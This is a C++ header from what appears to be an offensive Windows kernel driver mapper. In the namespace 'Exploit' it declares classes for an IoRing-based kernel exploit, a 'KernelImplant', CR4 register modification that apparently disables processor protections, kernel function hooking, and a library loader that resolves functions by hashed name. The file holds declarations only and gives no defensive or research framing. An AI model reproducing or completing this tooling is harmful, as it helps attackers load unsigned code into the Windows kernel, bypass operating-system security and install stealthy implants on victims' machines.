#pragma once
#include "IoRingExploit.hpp"
#include "LoadLibrary.hpp"


#include <Windows.h>
#include <mutex>
#include <string>
#include <thread>
#include <functional>
#include <thread>



namespace Exploit
{
	
	class ThreadChecks
	{
	public:
		bool libLoaderinitCheck = false;
		bool kernelImplantInitCheck = false;
		bool libLoaderclosed = false;
		bool libLoaderReady = false;
	};
	

	
	class HookedFunctionInfo
	{
	public:
		std::size_t usermodehookAddr = 0;
		void* win32UBase = nullptr;
		void* (*hookedFunction)(void*, void*);
		std::size_t readCr4Addr = 0;
		std::size_t originalCr4 = 0;
		std::size_t modifiedCr4 = 0;
		std::size_t writeCr4Addr = 0;
		std::size_t rdxJumpAddr = 0;
		std::size_t kernelHookAddr = 0;
	};
	


	class DriverMapInfo
	{
	public:
		NTSTATUS mapStatus = false;
		NTSTATUS driverStatus = false;
		void* driverBuffer = nullptr;
		std::size_t szDriverBuffer = 0;
		bool kernelCallbackCalled = false;
		///mapped imageInfo
		void* kernelBase = nullptr;
		void* win32kBase = nullptr;
		void* mappedNtoskrnlBase = nullptr;
		void* mappedWin32kBase = nullptr;
		std::size_t szMappedNtoskrnl = 0;
		std::size_t szMappedWin32k = 0;
	};
	
	
	
	class libLoadCaller
	{
	public:
		///loader flags
		bool isFilePath = false;
		int loadFlag = 0;
		int fileFlag = 0;
		/// for loading image
		bool loadImage = false;	
		bool closeThread = false;
		std::wstring imageName;
		std::size_t szImage = 0;
		void* mappedImageBase = nullptr;
		/// for loading function pointer
		bool loadFunction = false;	
		void* functionImageBase = nullptr;
		std::uint32_t hashedprocName = 0;
		void* procPtr = nullptr;
	};
	


	class DriverMapMain
	{
	public:
		ULONG_PTR ResolveExport(__in void* kernelBase, __in const char* procName);
		void KernelMemCopy(void* destination, void* source, SIZE_T length);
		int kernelStrComp(const char* string1, const char* string2);
		bool KernelFunctionHook(__in ULONG64 kernelAddrPtr, __in void* targetFunction, __in void* Param1, __in void* Param2);

		
		std::shared_ptr<libLoadCaller> libCall = std::make_shared<libLoadCaller>();
		std::shared_ptr<DriverMapInfo> mapInfo = std::make_shared<DriverMapInfo>();
		std::shared_ptr<HookedFunctionInfo> hookInfo = std::make_shared<HookedFunctionInfo>();
		std::shared_ptr<ThreadChecks> safetyChecks = std::make_shared<ThreadChecks>();

		std::shared_ptr<LibraryLoader> libLoader;
		std::shared_ptr<IoRingExploit> KernelImplant;
		void LibLoader();
		void IoRing();
		bool Decryption();

		void RunDriverMap();	
	};

	
	inline DriverMapMain KDMapper;
};


using fnMmAllocateContiguousMemoryEx = NTSTATUS (__fastcall*)(PSIZE_T, PHYSICAL_ADDRESS, PHYSICAL_ADDRESS, PHYSICAL_ADDRESS, NODE_REQUIREMENT, ULONG, PVOID, ULONG, ULONG, PVOID*);
using DRIVER_INITALIZE = NTSTATUS (__fastcall*)(void* Param1, void* Param2);


